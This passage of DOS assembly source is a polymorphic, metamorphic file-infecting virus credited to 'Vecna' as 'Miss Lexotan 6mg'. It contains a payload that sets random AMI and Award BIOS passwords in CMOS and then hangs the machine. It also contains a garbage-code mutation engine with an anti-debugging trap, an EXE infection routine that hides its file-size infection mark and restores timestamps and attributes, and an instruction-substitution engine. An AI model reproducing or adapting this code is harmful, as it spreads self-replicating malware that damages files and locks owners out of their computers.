       xor bp, mask __fill + mask __ax + mask __bx + mask __dx + \
               mask __flag
       mov ax, 002fh
       call read
       mov bx, ax
       mov al, 2dh
       call cmosstep1
       or al, 00010000b
       call cmosstep2
       mov al, 2fh
       mov dh, bl
       call write
       mov al, 3eh
       call read
       mov ah, al
       mov al, 3fh
       call read
       mov bx, ax
       mov ax, 0038h
       call rndpsw
       mov al, 39h
       call rndpsw
       mov dh, bh
       mov al, 3eh
       call write
       mov dh, bl
       mov al, 3fh
       call write
       jmp hehehe
award_psw:
       mov ax, 002fh                           ;AWARD BIOS...
       call read
       mov bx, ax
       mov al, 11h
       call cmosstep1
       or al, 00000001b
       call cmosstep2
       mov al, 1bh
       call cmosstep1
       or al, 00100000b
       call cmosstep2
       mov al, 2fh
       mov dh, bl
       call write
       mov al, 7dh
       call read
       mov ah, al
       mov al, 7eh
       call read
       mov bx, ax
       mov ax, 0050h
       call rndpsw
       mov al, 51h
       call rndpsw
       mov dh, bh
       mov al, 7dh
       call write
       mov dh, bl
       mov al, 7eh
       call write
ENDIF
       xor bp, mask __fill + mask __bp + mask __stack + mask __inte + \
               mask __flag
hehehe:
       cli
hang:
       jmp hang

IF CMOSPSW EQ TRUE
       xor bp, mask __fill + mask __ax + mask __bx + mask __dx + \
               mask __flag
read:
       and al, 7fh
       out 70h, al
       jmp $+2
       jmp $+2
       in al, 71h
       ret

write:
       and al, 7fh
       out 70h, al
       jmp $+2
       mov al, dh
       out 71h, al
       ret

rndpsw:
       mov dh, al
       call read
       sub bx, ax
       in al, 40h
       add bx, ax
       xchg al, dh
       call write
       ret

cmosstep1:
       mov dh, al
       call read
       sub bx, ax
       ret

cmosstep2:
       add bx, ax
       xchg al, dh
       call write
ENDIF
no_payload:
       ret

       xor bp, mask __fill + mask __ax + mask __di
get_any_reg:
       mov ax, 8
       call random                             ;register handling routines...
       ret                                     ;the heart of any _real_ engine

get_any_reg_no_sp:
       call get_any_reg
       cmp ax, _SP
       je get_any_reg_no_sp
       ret

get_valid_reg:
       call get_any_reg_no_sp
       push ax
       call get_reg_mask
       test wo ds:[gregs], ax
       pop ax
       ret

get_used_reg:
       call get_valid_reg
       jz get_used_reg
       ret

get_free_reg:
       call get_valid_reg
       jnz get_free_reg
       ret

get_free_regb:
       call get_any_reg
       push ax
       and ax, 011b
       call get_reg_mask
       test wo ds:[gregs], ax
       pop ax
       jnz get_free_regb
       ret

       xor bp, mask __fill + mask __ax + mask __cx + mask __di
get_reg_mask:
       push cx
       mov cx, 1
       xchg ax, cx
       shl ax, cl
       pop cx
       ret

       xor bp, mask __fill + mask __ax + mask __di
set_reg:
       call get_reg_mask
       or wo ds:[gregs], ax
       ret

clear_reg:
       call get_reg_mask
       not ax
       and wo ds:[gregs], ax
       ret

arf:
       mov ax, wo ds:[gregs]
       and ax, 11101111b
       cmp ax, 11101111b
       ret

aru:
       call arf
       or ax, ax
       ret

arfb:
       mov ax, wo ds:[gregs]
       and ax, 1111b
       cmp ax, 1111b
       ret

;The table below show the kind of garbling instructions we can generate, to be
;inserted between real instructions (the / mean garbling recursion)

;pfx                    es: - cs: - ss:
;mnop                   cld - bpice - int3 - nop - sti
;mmovimm                mov regw, imm
;mmovbimm               mov regb, imm
;mmovrr                 mov regw, regw
;mmovrrb                mov regb, regb
;mmovrsr                mov regw, segreg
;mmrm                   mov regw, [mem]
;mmrmb                  mov regb, [mem]
;mpp                    push regw / pop regw
;mppb                   push immb / pop regw
;mppw                   push immw / pop regw
;mppfr                  pushf / pop regw
;mppf                   push / pop (free)
;mnrw                   not regw
;mnrb                   not regb
;mpsrp                  push segreg / pop regw
;mjumps                 jump short
;mjumpn                 jump near
;mjccs                  conditional short jump
;mjccn                  conditional near jump
;mmrwi                  xor-add-sub-adc-sbb-or-and-cmp regw, imm
;mmrbi                  xor-add-sub-adc-sbb-or-and-cmp regb, imm
;mmrrw                  xor-add-sub-adc-sbb-or-and-cmp regw, regw
;mmrrb                  xor-add-sub-adc-sbb-or-and-cmp regb, regb
;mdecinc                dec-inc regw
;mdecincb               dec-inc regb
;mxchgw                 xchg regw, regw
;mxchgb                 xchg regb, regb
;mnegw                  neg regw
;mnegb                  neg regb
;mshfw                  shr-shl-ror-rol regw, 1
;mshfb                  shr-shl-ror-rol regb, 1
;mshfrw                 shr-shl-ror-rol regw, cl
;mshfrb                 shr-shl-ror-rol regb, cl
;mmarmw                 xor-add-sub-adc-sbb-or-and-cmp regw, [mem]
;mmarmb                 xor-add-sub-adc-sbb-or-and-cmp regb, [mem]
;mmmdw                  xor-add-sub-adc-sbb-or-and-cmp [mem], regw
;mmmdb                  xor-add-sub-adc-sbb-or-and-cmp [mem], regb

       stopgarbling
garbage:
       pusha
       xor bp, mask __fill + mask __ax + mask __cx + mask __di + \
               mask __extra
       cmp by ds:[recursion], MAX_REC
       je n_garb
       inc by ds:[recursion]
       mov ax, 8
       call random
       test wo ds:[gregs], mask __extra
       jz @@normal
       shl ax, 1
  @@normal:
       sub ax, 3
       jb dflag
       inc ax
       mov cx, ax
next_ii:
       push cx
       cld
       mov ax, 100
       call random
       cmp wo ds:[gregs], NO_GARBLE
       jne @@igarble
       xor bp, mask __fill + mask __ax + mask __cx + mask __di + \
               mask __bp + mask __extra + mask __stack
       mov bp, sp
       mov wo ss:[bp], 1
       call mnop
       xor bp, mask __fill + mask __ax + mask __cx + mask __di + \
               mask __extra
       jmp done
  @@igarble:
       prb 05, mmrwi
       prb 10, mmrbi
       prb 15, mmrrw
       prb 20, mmrrb
       prb 25, mmovimm
       prb 30, mmovbimm
       prb 35, mmarmw
       prb 40, mmarmb
       prb 45, mmovrr
       prb 50, mmmdw
       prb 55, mmmdb
       prb 60, mmovrrb
       prb 65, mmovrsr
       prb 70, mmrm
       prb 73, mmrmb
       prb 76, mshfw
       prb 79, mnentry
       prb 80, mshfb
       prb 81, mshfrw
       prb 82, mshfrb
       prb 83, mxchgw
       prb 84, mxchgb
       prb 85, mnegw
       prb 86, mnegb
       prb 87, mnrw
       prb 88, mnrb
       prb 89, mdecinc
       prb 90, mdecincb
       prb 91, mjumps
       prb 92, mjumpn
       prb 93, mjccs
       prb 94, mjccn
       prb 95, mpp
       prb 96, mppfr
       prb 97, mppb
       prb 98, mppw
       prb 99, mpsrp
       prb 100, mppf
done:
       pop cx
       dec cx
       jnz next_ii
dflag:
       dec by ds:[recursion]
       xor bp, mask __fill + mask __bp + mask __di + mask __extra + \
               mask __stack + mask __inte
n_garb:
       cli
       mov bp, sp
       mov wo ss:[bp], di
       mov di, wo ss:[bp+(7*2)+2]
       cmp by cs:[di], 0cch
  @@debug:
       jz @@debug
       sti
       stopgarbling
       popa
       ret

       xor bp, mask __fill + mask __ax + mask __di + mask __si + \
               mask __bx
mnentry:
       cmp by ds:[_entry], 0
       jne @@1
       cmp wo ds:[entries], MAX_ENTRIES        ;our table is full?
       je @@1
       inc by ds:[_entry]
       inc wo ds:[entries]
       mov ax, wo ds:[entries]
       call random
       mov si, ofs tentry
       shl ax, 1
       add si, ax
       mov bx, wo ds:[si]                      ;create new entrypoint in
       mov al, 0e9h                            ;virus code
       stosb
       stosw
       push di
       push wo ds:[gregs]
       mov wo ds:[gregs], mask __fill+ mask __extra + mask __flag
       call garbage
       call garbage
       mov ax, 10h
       call random
       or ax, ax
       mov al, 0e9h
       jnz @@0
       dec al
  @@0:
       stosb
       mov ax, di
       add ax, 2
       sub ax, ofs finalbase                   ;link it to another chunk or
       neg ax                                  ;to real entrypoint
       add ax, bx
       stosw
       call garbage
       pop wo ds:[gregs]
       mov ax, di
       pop si
       sub ax, si
       mov wo ds:[si-2], ax
       sub si, ofs finalbase
       mov bx, ofs tentry
       xchg bx, si
       mov ax, wo ds:[entries]
       dec ax
       shl ax, 1
       add si, ax
       mov wo ds:[si], bx
       dec by ds:[_entry]
  @@1:
       ret

       xor bp, mask __fill + mask __ax + mask __di + mask __cx
mnop:
       mov ax, 7
       call random
       mov cx, ax
       or cx, cx
       jnz @@2
  @@1:
       mov al, 0cch
       jmp stoit
  @@2:
       dec cx
       jnz @@3
       test wo ds:[gregs], mask __inte
       jnz @@5
       mov al, 0fbh
       jmp stoit
  @@3:
       dec cx
       jnz @@4
       mov al, 0f1h
       jmp stoit
  @@4:
       dec cx
       jnz @@5
       mov al, 0fch
       jmp stoit
  @@5:
       mov al, 090h
stoit:
       stosb
       ret

       xor bp, mask __fill + mask __ax + mask __di + mask __cx + \
               mask __dx
mmmdw:
       test wo ds:[gregs], mask __flag
       jz __ret
       call arf
       jz __ret
       mov al, 2eh
       stosb
       call get_free_reg
       mov dx, 1
       jmp __mmath_

mmmdb:
       test wo ds:[gregs], mask __flag
       jz __ret
       call arfb
       jz __ret
       mov al, 2eh
       stosb
       call get_free_regb
       xor dx, dx
__mmath_:
       call _mmath
       mov ax, 8*1024
       call random
       add ax, (STACKSIZE-STACKDEEP-8)*1024
       stosw
       ret

mmarmw:
       test wo ds:[gregs], mask __flag
       jz __ret
       call arf
       jz __ret
       call pfx
       call get_free_reg
       mov dx, 3
       jmp __mmath

mmarmb:
       test wo ds:[gregs], mask __flag
       jz __ret
       call arfb
       jz __ret
       call pfx
       call get_free_regb
       mov dx, 2
__mmath:
       call _mmath
       mov ax, -2
       call random
       stosw
       ret

_mmath:
       push ax
       mov ax, 8
       call random
       mov cx, ax
       xor ax, ax
_mlp:
       or cx, cx
       jz _mst
       add ax, 8
       dec cx
       jmp _mlp
_mst:
       add al, dl
       stosb
       pop ax
       mov cx, 3
       shl ax, cl
       or al, 0110b
       stosb
       ret

       xor bp, mask __fill + mask __ax + mask __di
mnegw:
       test wo ds:[gregs], mask __flag
       jz __ret
       call arf
       jz __ret
       mov al, 0f7h
       stosb
       call get_free_reg
       jmp _neg

mnegb:
       test wo ds:[gregs], mask __flag
       jz __ret
       call arfb
       jz __ret
       mov al, 0f6h
       stosb
       call get_free_regb
_neg:
       or al, 0d8h
       stosb
       ret

       xor bp, mask __fill + mask __ax + mask __di + mask __dx
mshfrw:
       test wo ds:[gregs], mask __flag
       jz _ret
       call arf
       jz __ret
       call get_free_reg
       mov dx, 3
       jmp _shf

mshfrb:
       test wo ds:[gregs], mask __flag
       jz __ret
       call arfb
       jz _ret
       call get_free_regb
       mov dx, 2
       jmp _shf

mshfw:
       test wo ds:[gregs], mask __flag
       jz _ret
       call arf
       jz __ret
       call get_free_reg
       mov dx, 1
       jmp _shf

mshfb:
       test wo ds:[gregs], mask __flag
       jz __ret
       call arfb
       jz _ret
       call get_free_regb
       xor dx, dx
_shf:
       push ax
       mov al, 0d0h
       add al, dl
       stosb
       mov ax, -1
       call random
       and ax, 00101000b
       or al, 11000000b
       pop dx
       or al, dl
       stosb
       ret

       xor bp, mask __fill + mask __ax + mask __di + mask __cx + \
               mask __dx + mask __bx
mxchgw:
       call arf
       jz _ret
       call get_free_reg
       push ax
       call get_free_reg
       mov bx, 87c0h
       jmp _xchgx

mxchgb:
       call arfb
       jz __ret
       call get_free_regb
       push ax
       call get_free_regb
       mov bx, 86c0h
_xchgx:
       pop dx
       cmp ax, dx
       je _ret
       mov cx, 3
       shl dx, cl
       or ax, dx
       or ax, bx
       jmp _xstos

       xor bp, mask __fill + mask __ax + mask __di + mask __cx
mdecincb:
       test wo ds:[gregs], mask __flag
       jz __ret
       call arfb
       jz __ret
       mov ax, -1
       call random
       and ax, 00001000b
       push ax
       call get_free_regb
       or ax, 0fec0h
       pop cx
       or ax, cx
_xstos:
       xchg al, ah
       stosw
       ret

mdecinc:
       test wo ds:[gregs], mask __flag
       jz __ret
       call arf
       jz _ret
       mov ax, -1
       call random
       and ax, 00001000b
       push ax
       call get_free_reg
       or al, 40h
       pop cx
       or ax, cx
       stosb
       ret

       xor bp, mask __fill + mask __ax + mask __di
mmovimm:
       call arf
       je _ret
       call get_free_reg
       or al, 0b8h
       stosb
       mov ax, -1
       call random
       stosw
  _ret:
       ret

mmovbimm:
       call arfb
       jz _ret
       call get_free_regb
       or al, 0b0h
       stosb
       mov ax, -1
       call random
       stosb
       ret

mmovrr:
       call arf
       jz __ret
       call get_free_reg
       push ax
       call get_any_reg
       xor bp, mask __fill + mask __ax + mask __di + mask __cx
       mov cx, 3
       shl ax, cl
       pop cx
       or ax, cx
       or ax, 1000100111000000b
xgst:
       xchg al, ah
       stosw
       ret

       xor bp, mask __fill + mask __ax + mask __di
mmovrrb:
       call arfb
       jz _ret
       call get_free_regb
       push ax
       call get_any_reg
       xor bp, mask __fill + mask __ax + mask __di + mask __cx
       mov cx, 3
       shl ax, cl
       pop cx
       or ax, cx
       xor bp, mask __fill + mask __ax + mask __di
       or ax, 1000100011000000b
       jmp xgst

mmovrsr:
       call arf
       jz _ret
       mov ax, 4
       call random
       xor bp, mask __fill + mask __ax + mask __di + mask __cx
       mov cx, 3
       shl ax, cl
       xor bp, mask __fill + mask __ax + mask __di
       or ax, 1000110011000000b
       push ax
       call get_free_reg
       xor bp, mask __fill + mask __ax + mask __di + mask __bx
       pop bx
       or ax, bx
       xor bp, mask __fill + mask __ax + mask __di
       jmp xgst


       xor bp, mask __fill + mask __ax + mask __di + mask __dx
mmrm:
       call arf
       jz _ret
       call pfx
       call get_free_reg
       mov dx, 1
       jmp mmmem
mmrmb:
       call arfb
       jz _ret
       call pfx
       call get_free_regb
       xor dx, dx
       xor bp, mask __fill + mask __ax + mask __di + mask __dx + \
               mask __cx
mmmem:
       mov cx, 3
       shl ax, cl
       or ax, 1000101000000110b
       xchg al, ah
       or ax, dx
       xor bp, mask __fill + mask __ax + mask __di
       stosw
       mov ax, -2
       call random
       stosw
       ret

       xor bp, mask __fill + mask __ax + mask __dx + mask __di
mnrb:
       call arfb
       jz _ret
       call get_free_regb
       xor dx, dx
       jmp mnr
mnrw:
       call arf
       jz __ret
       call get_free_reg
       mov dx, 1
mnr:
       or ax, 1111011011010000b
       xchg al, ah
       or ax, dx
       xor bp, mask __fill + mask __ax + mask __di
       stosw
       ret

pfx:
       mov ax, 7
       call random
       or ax, ax
       jnz @@1
       mov al, 2eh
       jmp @@3
  @@1:
       dec ax
       jnz @@2
       mov al, 26h
       jmp @@3
  @@2:
       dec ax
       jnz @@4
       mov al, 36h
  @@3:
       stosb
  @@4:
       ret

mpp:
       test wo ds:[gregs], mask __stack
       jnz _ret
       call arf
       jz _ret
       call get_any_reg_no_sp
       or al, 01010000b
       stosb
pstr:
       call garbage
       call get_free_reg
       or al, 01011000b
       stosb
       ret

mppb:
       test wo ds:[gregs], mask __stack
       jnz _ret
       mov ax, -1
       call random
       mov ah, 6ah
       xchg al, ah
       stosw
       jmp pstr

mppw:
       test wo ds:[gregs], mask __stack
       jnz _ret
       mov al, 68h
       stosb
       mov ax, -1
       call random
       stosw
pstr_:
       jmp pstr

       xor bp, mask __fill + mask __ax + mask __di + mask __cx
mpsrp:
       test wo ds:[gregs], mask __stack
       jnz __ret
       mov ax, 4
       call random
       mov cx, 3
       shl ax, cl
       or al, 110b
       stosb
       jmp pstr_

       xor bp, mask __fill + mask __ax + mask __di
mppfr:
       test wo ds:[gregs], mask __stack
       jnz _ret
       mov al, 10011100b
       stosb
       jmp pstr

       xor bp, mask __fill + mask __ax + mask __di
mppf:
       test wo ds:[gregs], mask __stack
       jnz _ret
       call aru
       jz __ret
       call get_used_reg
       push ax
       push ax
       push ax
       or al, 01010000b
       stosb
       pop ax
       call clear_reg
       call garbage
       pop ax
       call set_reg
       pop ax
       or al, 01011000b
       stosb
__ret:
       ret

       xor bp, mask __fill + mask __ax + mask __di
mjumps:
       mov al, 0ebh
       stosb
       mov ax, 0fh
       call random
       inc ax
       test wo ds:[gregs], mask __extra
       jz @@st
       shl ax, 1
  @@st:
       stosb
jmps:
       push ax
       mov ax, -1
       call random
       stosb
       pop ax
       dec ax
       jz _ret
       jmp jmps

mjumpn:
       mov al, 0e9h
       stosb
       mov ax, 01fh
       call random
       inc ax
       test wo ds:[gregs], mask __extra
       jz @@st
       shl ax, 1
  @@st:
       stosw
       jmp jmps

mjccn:
       mov ax, 0fh
       call random
       add ax, 0f80h
       xchg al, ah
       stosw
       stosw
       push di
       call garbage
       mov ax, di
       xor bp, mask __fill + mask __ax + mask __di + mask __si
       pop si
       sub ax, si
       mov wo ds:[si-2], ax
       ret

       xor bp, mask __fill + mask __ax + mask __di
mjccs:
       mov ax, 0fh
       call random
       add al, 70h
       stosw
       push di
       call garbage
       mov ax, di
       xor bp, mask __fill + mask __ax + mask __di + mask __si
       pop si
       sub ax, si
       cmp al, 7fh
       jb @@fine
       mov al, 90
       mov by ds:[si-2], al
  @@fine:
       mov by ds:[si-1], al
       xor bp, mask __fill + mask __ax + mask __di
       ret

       xor bp, mask __fill + mask __ax + mask __di + mask __dx
mmrwi:
       test wo ds:[gregs], mask __flag
       jz __ret
       call arf
       jz _ret
       call get_free_reg
       mov dx, 1
       call math
       mov ax, -2
       call random
       stosw
       ret

mmrbi:
       test wo ds:[gregs], mask __flag
       jz __ret
       call arfb
       jz _ret
       call get_free_regb
       xor dx, dx
       call math
       mov ax, -2
       call random
       stosb
       ret

math:
       push ax
       mov ax, 00000111b
       call random
       xor bp, mask __fill + mask __ax + mask __di + mask __dx + \
               mask __cx
       mov cx, 3
       shl ax, cl
       pop cx
       or ax, cx
       xor bp, mask __fill + mask __ax + mask __di + mask __dx
       or ax, 1000000011000000b
       or ah, dl
       xor bp, mask __fill + mask __ax + mask __di
       xchg al, ah
       stosw
       ret

       xor bp, mask __fill + mask __ax + mask __di + mask __dx
mmrrw:
       test wo ds:[gregs], mask __flag
       jz __ret
       call arf
       jz __ret
       call get_free_reg
       mov dx, 1
       jmp _math

mmrrb:
       test wo ds:[gregs], mask __flag
       jz __ret
       call arfb
       jz __ret
       call get_free_regb
       xor dx, dx

_math:
       push ax
       mov ax, -1
       call random
       and ax, 11100000111b
       xor bp, mask __fill + mask __ax + mask __di + mask __dx + \
               mask __cx
       mov cx, 3
       shl ax, cl
       pop cx
       or ax, cx
       or ax, 11000000b
       xor bp, mask __fill + mask __ax + mask __di + mask __dx
       or ah, dl
       jmp xgst

       xor bp, mask __fill + mask __ax
print_reverse:
       clc                                     ;this routine is pure elegance!
repeat:
       int 29h
       xchg al, ah                             ;(c) Vecna ;)
       cmc
       jc repeat
       ret

       xor bp, mask __fill + mask __ax + mask __di + mask __si
search_iit:
       mov di, wo ds:[iitpointer]
       add di, iit - size iittable
next_iit:
       cmp wo ds:[di.oldip], ax
       jbe found_ip
       sub di, size iittable
       cmp di, iit
       jne next_iit
found_ip:
       ret

       DOSCALL = mask __fill + mask __ax + mask __cx + mask __dx

       stopgarbling
infect_dsdx:                                   ;basic EXE infection
       pusha
       xor bp, mask __fill + mask __dx + mask __ax + mask __bx + \
               mask __cx
       mov ax, 4c36h - 7c8eh
       push dx
       add ax, 7c8eh
       mov dl, 0
       xchg al, ah
       int 21h
       xor dx, dx
       mul cx
       mul bx
       or dx, dx
       pop dx
       jnz enought_free_space
       cmp ax, 32 * 1024                       ;enought free disk space?
       jb error_back
       xor bp, mask __fill + mask __dx + mask __si + mask __ax
enought_free_space:
       mov si, dx
       cld
check_char:
       lodsb
       or al, al
       jz ok_name
       cmp al, '0'
       jb next_check_name                      ;files with numbers or the V
       cmp al, '9'                             ;letter inside are not infected
       jbe error_back
next_check_name:
       or al, 20h
       cmp al, 'v'
       je error_back
       jmp check_char
ok_name:
       xor bp, mask __fill + mask __dx + mask __si + mask __ax + \
               mask __cx + mask __di
       xor ax, ax
       mov di, ofs tentry
       mov cx, MAX_ENTRIES
  @@0:
       stosw
       dec cx
       jnz @@0
       xor bp, DOSCALL
       mov wo ds:[sucessfull], 0
       mov ax, 4301h + 0aaf2h
       xor cx, cx
       sub ax, 0aaf2h
       int 21h
       xor bp, DOSCALL + mask __bx
       mov bx, 3d02h - 0ef56h + 24feh
       mov ax, 0ef56h
       sub bx, 24feh
       add ax, bx
       int 21h
       jc error_back
       xchg ax, bx
       mov ax, 4c00h
       sub ah, 4ch - 3fh
       mov dx, exe_header
       mov cx, 20h
       int 21h
       xor bp, mask __fill + mask __ax + mask __bx + mask __cx
       xor cx, ax
       jnz close
       xor bp, mask __fill + mask __ax + mask __bx
       mov ax, wo ds:[exe_mark]
       not ax
       cmp ax, not 'ZM'
       jne close
       mov ax, 40h
       cmp wo ds:[exe_rel@], ax
       je close
       xor ax, ax
       xchg ax, wo ds:[exe_ip]
       mov wo ds:[mem_ip], ax
       mov ax, wo ds:[exe_cs]
       mov wo ds:[mem_cs], ax
       mov ax, wo ds:[exe_ss]
       mov wo ds:[mem_ss], ax
       mov ax, 1024
       call random
       add ax, STACKSIZE*1024-1024
       and ax, NOT 1
       xchg ax, wo ds:[exe_sp]
       mov wo ds:[mem_sp], ax
       mov ax, wo ds:[exe_min]
       cmp wo ds:[exe_max], ax
       je close
       add ax, 0f00h
       mov wo ds:[exe_max], ax
       mov wo ds:[exe_min], ax
       mov ax, 4202h - 100h
       xor bp, DOSCALL + mask __bx
       xor cx, cx
       add ax, 100h
       cwd
       int 21h
       cmp ax, 8192
       jbe close
       cmp dx, 6
       ja close
       pusha
       mov cx, 200h
       div cx
       cmp wo ds:[exe_modp], dx
       jne size_error
       inc ax
       cmp wo ds:[exe_divp], ax
size_error:
       popa
       jne close
       push dx ax
       mov cx, 10
       div cx
       or dx, dx
       pop ax dx
       jz close
       push dx ax
       mov cx, DIV_VALUE                       ;infection mark is:
       div cx                                  ;FileSize MOD 19 == 15
       cmp dx, MOD_VALUE
       pop ax dx                               ;the infection mark cant be
       jz close                                ;obvious, else all the engine
       mov cx, 16                              ;work will be lost ;)
       div cx
       or dx, dx
       jz close                                ;files divisible by 10 or 16
       sub cx, dx                              ;without remainder arent touched
       inc ax                                  ;(baitz)
       push ax
       mov ax, 4201h - 4200h
       add ah, 42h
       mov dx, cx
       xor cx, cx
       int 21h
       push bx
       xor bp, mask __fill + mask __si + mask __di + mask __cx
clean_copy equ this byte
       mov si, 0
       mov di, copybase
       mov cx, viralend-virusstart
       push ds
       push cs
       pop ds
       call decript
       xor bp, mask __fill + mask __ax
       pop ds
       mov ax, wo ds:[mem_cs]
       mov wo ds:[copybase+ofs _cs_], ax
       mov ax, wo ds:[mem_ip]
       mov wo ds:[copybase+ofs _ip_], ax
       mov ax, wo ds:[mem_ss]
       mov wo ds:[copybase+ofs _ss_], ax
       mov ax, wo ds:[mem_sp]
       mov wo ds:[copybase+ofs _sp_], ax
       inc wo ds:[copybase+ofs generation]
       xor bp, DOSCALL + mask __bx
       call engine
       xor ax, ax
       mov bh, 40h xor 0feh
       xor bh, 0feh
       add ax, bx
       pop bx
       int 21h
       pop dx
       mov cx, wo ds:[exe_head]
       sub dx, cx
       mov wo ds:[exe_cs], dx
       mov ax, 20h
       call random
       inc ax
       sub dx, ax
       mov wo ds:[exe_ss], dx
       mov ax, 4202h/2
       cwd
       xor cx, cx
       shl ax, 1
       int 21h
       mov cx, DIV_VALUE
       div cx
       mov ax, MOD_VALUE
       sub ax, dx
       jnb no_neg
       add ax, MOD_VALUE
no_neg:
       mov dx, 4202h
       xchg ax, dx
       xor cx, cx
       int 21h
       mov ah, 40h
       xor cx, cx
       int 21h
       mov ax, 4202h - 1202h
       xor cx, cx
       add ax, 1202h
       cwd
       int 21h
       mov cx, 512
       div cx
       or dx, dx
       jz skippad
       inc ax
skippad:
       mov wo ds:[exe_modp], dx
       mov wo ds:[exe_divp], ax
       mov ax, 4200h xor 9fa7h
       xor cx, cx
       xor ax, 9fa7h
       cwd
       add ax, cx
       int 21h
       push bx
       mov cx, MAX_ENTRIES
other_ip:
       mov ax, wo ds:[entries]
       call random
       mov bx, ofs tentry
       shl ax, 1
       add bx, ax
       mov ax, wo ds:[bx]
       mov wo ds:[exe_ip], ax
       or ax, ax
       jnz fine_ip
       dec cx
       jnz other_ip
fine_ip:
       pop bx
       mov ah, 40h / 2
       mov dx, exe_header
       mov cx, 20h
       add ah, cl
       int 21h
       inc wo ds:[sucessfull]
close:
       mov ax, 5701h - 100h
       add ah, al
       mov dx, wo ds:[dta_date]
       mov cx, wo ds:[dta_time]
       int 21h
       mov ax, 3ecdh + 05a20h
       sub ax, 05a20h
       int 21h
       xor bp, DOSCALL
       mov ax, (4301h-12feh) xor 56ach
       xor cx, cx
       mov cl, by ds:[dta_attr]
       xor ax, 56ach
       mov dx, dta+1eh
       add ax, 12feh
       int 21h
error_back:
       stopgarbling
       popa
       ret

;this table show the translations between instructions we do:

;add                    sub(-)
;sub                    add(-)
;mov reg, reg           push / pop
;xor reg, reg           sub reg, reg - mov reg, 0 - and reg, 0 -
;                       push 0 / pop regw
;or reg, reg            cmp reg, 0 - test reg, reg
;mov reg, imm           push imm / pop
;stosw                  mov [di], ax / ( inc di / inc di - add di, 2 )
;cmp ax, imm            push ax / sub ax, imm / pop ax
;cmp al, imm            push ax / sub al, imm / pop ax

IF METAMORPH EQ TRUE
       xor bp, mask __fill + mask __cx + mask __si + mask __di + \
               mask __ax
mgen:
       mov ax, 8
       call random
       or ax, ax
       jz _do
_store:
       cld
       rep movsb
       ret

       xor bp, mask __fill + mask __di + mask __si + mask __cx + \
               mask __dx + mask __bx + mask __ax
_do:
       push si
       push cx
       mov ax, wo ds:[si]
       mov bx, -1
       xor dx, dx
       cmp al, 05h
       je @@add
       cmp al, 81h
       jne chk_mov
       mov dl, ah
       mov dh, dl
       and dx, 1111100000000111b
       inc bx
       cmp dh, 11101000b
       je @@sub
       cmp dh, 11000000b
       jne chk_mov
  @@add:
       mov al, 2dh
       or dl, dl
       jz @@stobyte
       mov ax, 1110100010000001b
       or ah, dl
       jmp @@stoword
  @@sub:
       mov al, 5h
       or dl, dl
       jz @@stobyte
       mov ax, 1100000010000001b
       or ah, dl
  @@stoword:
       stosw
       jmp @@generic
  @@stobyte:
       stosb
  @@generic:
       mov ax, wo ds:[si+bx+2]
       neg ax
       stosw
       jmp _done

chk_mov:
       mov cl, al
       and cl, not 00000010b
       cmp cl, 10001001b
       jne chk_xor
       mov cl, ah
       and cl, 11000000b
       cmp cl, 11000000b
       jne chk_xor
       mov cx, 3
       xor dx, dx
       mov dl, ah
       mov bx, dx
       and bx, 00111000b
       and dx, 00000111b
       shr bx, cl
       test al, 00000010b
       jz @@ok
       xchg bx, dx
  @@ok:
       mov al, bl
       or al, 50h
       stosb
       call garbage
       mov al, dl
       or al, 58h
       stosb
       jmp _done

chk_xor:
       mov cx, 3
       xor dx, dx
       mov dl, ah
       mov bx, dx
       and dx, 0000000000000111b
       and bx, 0000000000111000b
       shr bx, cl
       cmp dx, bx
       jne chk_movimm
       mov cl, al
       and cl, 11111101b
       cmp cl, 00001001b
       je _or
       cmp cl, 00110001b
       jne chk_movimm
       mov ax, 8
       call random
       or ax, ax
       jz @@sub
       dec ax
       jz @@mov
       dec ax
       jz @@and
       dec ax
       jz @@push
       mov ax, 006ah
       stosw
       call garbage
       mov al, 58h
       or al, bl
       stosb
       jmp _done
  @@push:
       push dx
       mov ax, 6ah
       stosw
       call garbage
       pop ax
       or al, 58h
       stosb
       jmp _done
  @@and:
       mov ax, 0e083h
       or ah, dl
       stosw
       xor ax, ax
       stosb
       jmp __done
  @@sub:
       mov cx, 3
       mov ax, 0c029h
       or ah, dl
       shl dx, cl
       or ah, dl
       jmp @@cool
  @@mov:
       mov al, 0b8h
       or al, dl
       stosb
       xor ax, ax
  @@cool:
       stosw
       jmp _done
_or:
       mov ax, 8
       call random
       or ax, ax
       jz @@cmp
       mov ax, 0c085h
       or ah, dl
       mov cx, 3
       shl dx, cl
       or ah, dl
       stosw
       jmp __done
  @@cmp:
       mov ax, 0f883h
       or ah, dl
       stosw
       xor ax, ax
       stosb
__done:
       jmp _done

chk_movimm:
       mov dx, ax
       mov bx, ax
       and dx, 11111000b
       and bx, 00000111b
       cmp dx, 0b8h
       jne chk_stos
       mov al, 68h
       stosb
       mov ax, wo ds:[si+1]
       stosw
       call garbage
       mov al, 58h
       or al, bl
       stosb
       jmp _done

chk_stos:
       mov bl, al
       cmp bl, 0abh
       jne _cmpaxal
       mov al, 26h
       stosb
       mov ax, 0589h
       stosw
       call garbage
       mov ax, 3
       call random
       or ax, ax
       jz @@add
       mov al, 47h
       stosb
       call garbage
       mov al, 47h
       stosb
  @@done:
       jmp _done
  @@add:
       mov al, 83h
       stosb
       mov ax, 02c7h
       stosw
       jmp @@done

_cmpaxal:
       jmp not_implemented
       mov dx, ax
       cmp dl, 3dh
       je __cax
       cmp dl, 3ch
       jne not_implemented
       xor cx, cx
       mov cl, by ds:[si+1]
       xor dx, dx
       jmp __cmpx
__cax:
       mov dx, 1
       mov cx, wo ds:[si+1]
__cmpx:
       mov ax, 2ch
       add ax, dx
       push cx
       push ax
       mov al, 50h
       stosb
       call garbage
       pop ax
       stosb
       pop ax
       cmp ah, 0
       jz @@1
       stosw
       jmp @@2
  @@1:
       stosb
  @@2:
       call garbage
       mov al, 58h
       stosb
       jmp __done

       xor bp, mask __fill + mask __si + mask __di + mask __cx
not_implemented:
       pop cx
       pop si
       jmp _store
_done:
       pop cx
       pop si
       add si, cx
       ret
ENDIF

       dw -1

viralend:



;additional data needed for the 1th generation host
;this code and data dont travel together with the virus
.386p

       db 64 - ( ( ofs viralend - ofs virusstart ) mod 16 ) dup (0)

decript:
       cld
       db 2eh
       rep movsb
       ret

txt1   db 'Miss Lexotan 6mg (c) Vecna', 10, 13
       db 'Size: 0x0'
number db '0000 ('
number2 db '00000) bytes',10,13,'$'

hextable db '0123456789ABCDEF'

make_hex:
       mov di, ofs number
       mov bx, ofs hextable
       mov cx, 4
@@1:
       rol ax, 4
       push ax
       and ax, 00001111b
       xlat
       stosb
       pop ax
       loop @@1
       ret

make_dec:
       std
       mov di, ofs number2+4
       mov bp, 10
